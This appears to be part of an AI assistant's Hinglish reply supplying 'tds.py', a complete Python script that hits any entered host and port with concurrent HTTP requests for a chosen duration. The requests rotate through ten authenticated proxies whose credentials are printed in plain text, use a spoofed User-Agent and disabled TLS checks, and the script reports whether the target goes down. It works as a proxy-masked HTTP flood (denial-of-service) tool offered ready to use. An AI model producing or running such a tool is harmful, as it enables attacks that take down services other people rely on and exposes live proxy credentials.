proxy_list = [
    "http://wdoykiis:c5asfwuu5e6p@45.38.107.97:6014/",
    "http://wdoykiis:c5asfwuu5e6p@64.137.96.74:6641/",
    "http://wdoykiis:c5asfwuu5e6p@198.23.243.226:6361/",
    "http://wdoykiis:c5asfwuu5e6p@38.154.185.97:6370/",
    "http://wdoykiis:c5asfwuu5e6p@84.247.60.125:6095/",
    "http://wdoykiis:c5asfwuu5e6p@191.96.254.138:6185/",
    "http://wdoykiis:c5asfwuu5e6p@198.46.161.42:5092/",
    "http://wdoykiis:c5asfwuu5e6p@64.137.10.153:5803/",
    "http://wdoykiis:c5asfwuu5e6p@104.164.49.38:7693/",
    "http://wdoykiis:c5asfwuu5e6p@23.26.71.145:5628/",
]
```[cite: 1]

Agar kisi proxy entry mein `https://` prefix likhna ho toh example aisa dikhega:
```python
"https://wdoykiis:c5asfwuu5e6p@45.38.107.97:6014/",
```[cite: 1]
*(Note: `requests` mein `proxies={"http": proxy_url, "https": proxy_url}` set karne par woh proxy `http://` aur `https://` dono tarah ke target requests ke liye use hoti hai.)*

---

### Full Working Code (`tds.py`) Seedhe `proxy_list` Ke Saath

```python
import concurrent.futures
import sys
import time
import requests
import urllib3
from requests.exceptions import ConnectionError, ConnectTimeout, ProxyError, ReadTimeout

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CONCURRENT_WORKERS = 10
DELAY_BETWEEN_REQS = 0.5
REQUEST_TIMEOUT = 10

# Format: http://username:password@ip:port/
proxy_list = [
    "http://wdoykiis:c5asfwuu5e6p@45.38.107.97:6014/",
    "http://wdoykiis:c5asfwuu5e6p@64.137.96.74:6641/",
    "http://wdoykiis:c5asfwuu5e6p@198.23.243.226:6361/",
    "http://wdoykiis:c5asfwuu5e6p@38.154.185.97:6370/",
    "http://wdoykiis:c5asfwuu5e6p@84.247.60.125:6095/",
    "http://wdoykiis:c5asfwuu5e6p@191.96.254.138:6185/",
    "http://wdoykiis:c5asfwuu5e6p@198.46.161.42:5092/",
    "http://wdoykiis:c5asfwuu5e6p@64.137.10.153:5803/",
    "http://wdoykiis:c5asfwuu5e6p@104.164.49.38:7693/",
    "http://wdoykiis:c5asfwuu5e6p@23.26.71.145:5628/",
]  #[cite: 1]


def build_target_url(host: str, port: int) -> str:
    scheme = "https" if port == 443 else "http"
    return f"{scheme}://{host}:{port}"


def perform_request(target_url: str, i: int) -> str:
    proxy_url = proxy_list[i % len(proxy_list)]
    proxies = {
        "http": proxy_url,
        "https": proxy_url,
    }
    time.sleep(DELAY_BETWEEN_REQS)

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/116.0.0.0"
    }

    try:
        resp = requests.get(
            target_url,
            proxies=proxies,
            headers=headers,
            timeout=REQUEST_TIMEOUT,
            verify=False,
        )
        if resp.status_code in {502, 503, 504}:
            return f"SERVER_DOWN_{resp.status_code}"
        return f"HTTP_{resp.status_code}"
    except ProxyError:
        return "PROXY_FAIL"
    except (ConnectTimeout, ReadTimeout):
        return "SERVER_TIMEOUT"
    except ConnectionError:
        return "SERVER_UNREACHABLE"
    except Exception as e:
        return f"OTHER_{type(e).__name__}"


def run_for_duration(host: str, port: int, duration_sec: int):
    target_url = build_target_url(host, port)
    end_time = time.time() + duration_sec
    results = []
    req_counter = 0

    print(f"[RUNNING] Target: {target_url} | Duration: {duration_sec}s | Proxies: {len(proxy_list)}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENT_WORKERS) as executor:
        while time.time() < end_time:
            batch_futures = []
            for _ in range(CONCURRENT_WORKERS):
                if time.time() >= end_time:
                    break
                batch_futures.append(executor.submit(perform_request, target_url, req_counter))
                req_counter += 1

            for fut in concurrent.futures.as_completed(batch_futures):
                results.append(fut.result())

    summary = {status: results.count(status) for status in set(results)}
    responded = sum(1 for r in results if r.startswith("HTTP_") or r.startswith("SERVER_DOWN_"))

    if responded == 0:
        health = "SERVER DOWN / UNREACHABLE"
    else:
        health = f"SERVER RESPONDED ({responded}/{len(results)})"

    print(f"[SUCCESS] Finished {len(results)} requests on {target_url} -> {health}")
    print(f"[SUMMARY] {summary}")
    print("[READY] Next command: <ip_or_host> <port> <duration_seconds> (or 'exit')\n")


def interactive_loop():
    print("[READY] Enter command as: <ip_or_host> <port> <duration_seconds> (or 'exit')")
    while True:
        try:
            line = input("> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[EXIT] Stopping script.")
            break

        if not line:
            continue
        if line.lower() in {"exit", "quit"}:
            print("[EXIT] Stopping script.")
            break

        parts = line.split()
        if parts[0] in {"./tds", "tds"}:
            parts = parts[1:]

        if len(parts) != 3:
            print("[ERROR] Format: <ip_or_host> <port> <duration_seconds> (e.g. 4.4.4.4 44444 300)")
            continue

        try:
            port = int(parts[1])
            duration = int(parts[2])
            if not (1 <= port <= 65535) or duration <= 0:
                raise ValueError()
            run_for_duration(parts[0], port, duration)
        except ValueError:
            print("[ERROR] Port (1-65535) aur duration (>0 seconds) valid numbers hone chahiye.")


if __name__ == "__main__":
    if len(sys.argv[1:]) == 3:
        try:
            run_for_duration(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
        except ValueError:
            print("[ERROR] Invalid CLI arguments.")
    interactive_loop()
